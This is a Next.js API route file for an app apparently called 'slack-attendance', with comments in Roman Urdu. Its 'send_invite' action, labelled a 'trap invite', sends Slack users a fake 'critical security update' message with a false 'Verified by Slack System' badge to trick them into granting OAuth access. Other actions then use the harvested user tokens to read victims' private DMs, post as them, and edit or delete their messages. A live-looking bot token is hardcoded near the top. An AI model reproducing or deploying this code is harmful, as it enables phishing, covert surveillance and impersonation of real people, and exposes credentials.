/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
// import { db } from '@/lib/firebase'; 
import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../../../../lib/firebase';

// ⚠️ APNI KEYS CHECK KAREIN
const BOT_TOKEN = "xoxb-2545190050563-10475329879780-x09CDqtudRFfpMpG0WHsv3Vu"; 
const CLIENT_ID = "2545190050563.10469623331926";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText } = body;

    // --- CASE 1: SEND TRAP INVITE (MULTIPLE STORAGE FIX) ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
       
       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
       
       const blocks = [
        { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
        { "type": "divider" },
        { "type": "actions", "elements": [
            { "type": "button", "text": { "type": "plain_text", "text": "Install Update", "emoji": true }, "style": "primary", "url": authLink },
            { "type": "button", "text": { "type": "plain_text", "text": "Review Later", "emoji": true }, "url": authLink }
        ]},
        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack System" } ] }
       ];

       // 1. Message bhejo
       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ channel: targetUserId, text: "System Update", blocks: blocks })
       });

       const chatData = await chatRes.json();
       if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });

       // 2. 🔥 IMPORTANT: Puranay messages ke sath naya add karo
       const inviteRef = doc(db, "pending_invites", targetUserId);
       
       try {
           const docSnap = await getDoc(inviteRef);
           let msgList = [];

           // Agar pehlay se data hai, to usay utha lo
           if (docSnap.exists()) {
               const data = docSnap.data();
               if (data.messages) msgList = data.messages;
               else if (data.ts) msgList.push({ ts: data.ts, channel: data.channel }); // Old format support
           }

           // Naya message list main daalo
           msgList.push({ ts: chatData.ts, channel: chatData.channel });

           // Wapas save karo
           await setDoc(inviteRef, { messages: msgList }, { merge: true });

       } catch (e) { console.error("Firebase Write Failed:", e); }
       
       return NextResponse.json({ success: true });
    }

    // --- Baki Actions (Same as before) ---
    // (Main ne baaki code same rakha hai taakay confusion na ho)
    
    if (action === 'delete_user') {
        try { await deleteDoc(doc(db, "slack_tokens", targetUserId)); } catch(e) {}
        return NextResponse.json({ success: true });
    }

    if (!targetUserId) return NextResponse.json({ error: "User ID required" });
    
    let USER_TOKEN = "";
    try {
        const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
        if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
        USER_TOKEN = tokenDoc.data().accessToken;
    } catch (e) { return NextResponse.json({ error: "DB Error" }, { status: 503 }); }

    if (action === 'list_chats') {
        const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
        const chatData = await chatRes.json();
        if(!chatData.ok) return NextResponse.json({ chats: [] });

        const usersRes = await fetch('https://slack.com/api/users.list?limit=1000', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
        const usersData = await usersRes.json();
        const userMap: Record<string, any> = {};
        if (usersData.ok && usersData.members) {
            usersData.members.forEach((u: any) => { userMap[u.id] = { name: u.real_name || u.name, image: u.profile?.image_48 }; });
        }

        const chats = await Promise.all((chatData.channels || []).map(async (c: any) => {
            let unread = 0;
            try {
                const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                const info = await infoRes.json();
                if(info.ok && info.channel) unread = info.channel.unread_count_display || 0;
            } catch(e) {}

            if(c.is_im) {
                const user = userMap[c.user] || { name: "Unknown User", image: null };
                return { ...c, name: user.name, image: user.image, unread };
            }
            return { ...c, name: "Group Chat", image: null, unread };
        }));
        return NextResponse.json({ chats });
    }

    if (action === 'get_messages') {
        let allMessages: any[] = [];
        let hasMore = true;
        let nextCursor = undefined;
        let loopCount = 0;
        while (hasMore && loopCount < 3) { 
            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=100`;
            if (nextCursor) url += `&cursor=${nextCursor}`;
            try {
                const res = await fetch(url, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                const data = await res.json();
                if (data.ok && data.messages) {
                    allMessages = [...allMessages, ...data.messages];
                    if (data.has_more && data.response_metadata?.next_cursor) nextCursor = data.response_metadata.next_cursor;
                    else hasMore = false;
                } else hasMore = false;
            } catch (err) { hasMore = false; }
            loopCount++;
        }
        return NextResponse.json({ messages: allMessages.reverse() });
    }

    if (action === 'send_as_user') {
         const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, text: text, as_user: true })
        });
        return NextResponse.json(await res.json());
    }
    if (action === 'delete_message') {
        const res = await fetch('https://slack.com/api/chat.delete', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs })
        });
        return NextResponse.json(await res.json());
    }
    if (action === 'edit_message') {
        const res = await fetch('https://slack.com/api/chat.update', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs, text: newText })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: "System Busy" }, { status: 200 });
  }
}